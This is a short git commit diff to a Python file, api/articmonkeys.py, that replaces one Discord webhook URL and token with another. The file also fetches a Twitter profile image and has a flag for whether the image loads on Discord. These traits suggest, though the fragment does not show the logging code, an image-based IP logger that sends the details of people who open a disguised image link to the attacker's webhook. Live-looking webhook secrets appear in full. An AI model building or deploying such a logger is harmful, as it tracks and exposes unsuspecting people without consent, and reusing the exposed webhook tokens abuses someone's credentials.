00a82001b72c0bf44df27625dba33dad3609983f
ducminhducminh46 <ducminhducminh46@gmail.com>
2026-06-18 22:10:36 +0700

    Update articmonkeys.py

--- api/articmonkeys.py
+++ api/articmonkeys.py
@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+webhook = 'https://discord.com/api/webhooks/1516801634607300718/Oxff-9d3wzdxswuzYR3kkxNWppbYKccMaV4K9yazpQCykb6IaQ7C-1_7-mh70nYIzVkC'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
